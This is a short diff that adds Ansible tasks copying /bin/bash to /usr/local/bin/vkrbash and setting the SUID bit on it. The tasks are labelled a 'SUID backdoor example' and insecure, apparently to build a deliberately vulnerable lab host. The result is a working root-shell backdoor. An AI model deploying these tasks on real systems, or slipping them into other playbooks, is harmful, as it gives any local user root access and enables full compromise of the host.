@@ -1,0 +1,12 @@
+- name: Copy bash to /usr/local/bin/vkrbash (SUID backdoor example)
+  ansible.builtin.copy:
+    src: /bin/bash
+    dest: /usr/local/bin/vkrbash
+    mode: "0755"
+    remote_src: true
+
+- name: Set SUID bit on /usr/local/bin/vkrbash (insecure)
+  ansible.builtin.file:
+    path: /usr/local/bin/vkrbash
+    mode: "4755"
+
